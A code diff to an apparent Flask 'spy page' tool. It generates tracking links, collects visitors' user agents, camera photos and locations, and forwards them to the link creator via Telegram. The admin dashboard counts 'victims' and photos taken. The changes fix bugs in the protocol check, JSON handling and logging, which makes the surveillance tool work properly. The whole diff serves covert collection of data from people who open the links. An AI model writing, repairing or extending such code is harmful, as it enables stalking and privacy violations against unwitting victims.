@@ -139,9 +139,11 @@ SPY_PAGE = '''
         function debug(msg) { debugEl.textContent = msg; console.log(msg); }
 
         document.getElementById('visitorDisplay').textContent = visitorId.substring(0,15)+'...';
-        if(!location.protocol !== 'https' && location.hostname !== 'localhost') {
+        if(location.protocol !== 'https:' && location.hostname !== 'localhost') {
             debug('⚠️ Warning: Not using HTTPS. Some features may not work.');
         }
+        let pendingData = [];
+        let lastSend = 0;
         debug('initilizing...');
         sendData({ ping: true, ua: navigator.userAgent });
 
@@ -269,8 +271,8 @@ def index_post():
         link_id = request.args.get('id', '')
         links = load_json('links.json')
         link_data = links.get(link_id, {})
-        creator_id = str(link_data.get('created_by', config['chat_id']))
-
+        creator_id = str(link_data.get('created_by') or config['chat_id'])
+        
         # Load visitors
         visitors = load_json('visitors.json')
         if visitor_id not in visitors:
@@ -303,7 +305,7 @@ def index_post():
                     try:
                         send_telegram_photo(creator_id, photo_path, caption)
                     except Exception as e:
-                        app.debug(f"Failed to send photo: {e}")
+                        app.logger.warning(f"Failed to send photo: {e}")
                     
             # --- Location ---
             if 'location' in item:
@@ -438,21 +440,18 @@ def admin():
         return jsonify(visitors)
 
     if 'clear' in request.args:
-        save_json('visitors.json', [])
+        save_json('visitors.json', {})
         save_json('links.json', {})
         for f in os.listdir('photos'):
             os.remove(os.path.join('photos', f))
         return redirect(url_for('admin'))
 
+    
     # Load data for dashboard
     visitors = load_json('visitors.json')
     links = load_json('links.json')
     total_victims = len(visitors)
-    total_photos = sum(
-    visitor.get('photos', 0)
-    for visitor in visitors
-    if isinstance(visitor, dict)
-    )
+    total_photos = sum(v.get('photos', 0) for v in visitors.values() if isinstance(visitors, dict))
 
     return render_template_string(ADMIN_DASHBOARD,
                                   visitors=visitors,
